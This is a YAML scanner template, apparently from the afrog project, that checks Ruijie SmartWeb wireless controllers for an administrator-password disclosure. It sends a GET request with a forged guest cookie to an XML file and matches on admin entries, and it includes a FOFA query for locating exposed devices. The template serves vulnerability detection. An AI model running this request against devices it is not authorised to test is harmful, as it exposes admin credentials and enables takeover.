# 来源: afrog（转换自 afrog/xray 表达式 POC）
http:
  - headers:
      Cookie: login=1; oid=1.3.6.1.4.1.4881.1.1.10.1.3; type=WS5302; auth=Z3Vlc3Q6Z3Vlc3Q%3D; user=guest
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - <![CDATA[   admin]]>
        condition: and
    method: GET
    path:
      - '{{BaseURL}}/web/xml/webuser-auth.xml'
id: ruijie-smartweb-password-disclosure
info:
  author: zan8in
  description: |-
    锐捷网络股份有限公司无线smartweb管理系统存在逻辑缺陷漏洞，攻击者可从漏洞获取到管理员账号密码，从而以管理员权限登录。
    fofa: app="Ruijie-WiFi" && title="无线smartWeb--登录页面"
  metadata:
    argus-execution-class: detection
    argus-import-license: MIT License
    argus-import-source: afrog
    argus-risk-level: high
  name: Ruijie smartweb password information disclosure
  severity: high
  tags: ruijie,disclosure,argus-import
